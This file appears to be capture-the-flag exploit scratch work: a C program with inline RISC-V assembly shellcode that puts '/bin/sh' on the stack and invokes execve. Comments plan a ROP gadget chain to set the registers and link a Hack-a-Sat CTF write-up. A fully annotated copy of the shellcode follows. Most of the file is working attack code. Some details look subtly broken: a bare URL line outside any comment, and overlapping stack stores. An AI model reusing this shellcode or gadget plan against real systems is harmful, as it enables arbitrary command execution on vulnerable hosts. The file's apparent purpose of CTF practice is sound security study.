#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>

int main(int argc, char **argv) 
{
    //execve("/bin/sh",0,0);
    __asm("li a0, 0x6e69622f\n\t"
          "addi sp,sp,-8\n\t"
          "sd a0,0(sp)\n\t"
          "li a0, 0x0068732f\n\t"
    //__asm("li a0,0x0068732f6e69622f\n\t"
          "sd a0, 4(sp)\n\t"
          "addi a0,sp,0\n\t"
          "li a2,0x0\n\t"
          "li a1,0x0\n\t"
          "li a7,221\n\t"
          "ecall\n\t"
          "li a7,93\n\t"
          "ecall\n\t");

//So I want to:
//1. pop a1, a2, and a7 with 0, 0, and 221 respectively (c.ldsp a1, c.ldsp a2, c.ldsp a7)
//2. pop a0 with 0x0068732f6e69622f 
//3. Increment the stack pointer
//4. Store a0 into 0(s0)
//How to do this with gadgets is the challenge.


// Referencing this write-up for using ROPgadget:
https://github.com/nikosChalk/ctf-writeups/blob/master/hack-a-sat-23/pwn/dROP-Baby/src/solution.py

// This assembly is drawn from an external blog and I forgot to save the link, sorry. It's pretty generic, as these things go
//.globl _start
//_start:
//
//    //#execve(*filename, *argv[], *envp[])
//    li a0,0x6e69622f    #nib/
//    addi sp,sp,-8       #set up the stack
//    sd a0,0(sp)     #store '/bin'
//    li a0,0x0068732f    #\0hs/ 
//    sd a0,4(sp)     #store '/sh\0'
//    addi a0,sp,0        #set a0 to the top of the stack
//    li a2,0x0       #set argv[] to NULL
//    li a1,0x0       #set envp[] to NULL
//    li a7, 221      #221 is the __NR_execve 
//    ecall
//    li a7, 93       #exit value of execve is in a0
//    ecall           #exit the program with the retval of execve

    return 0;
}

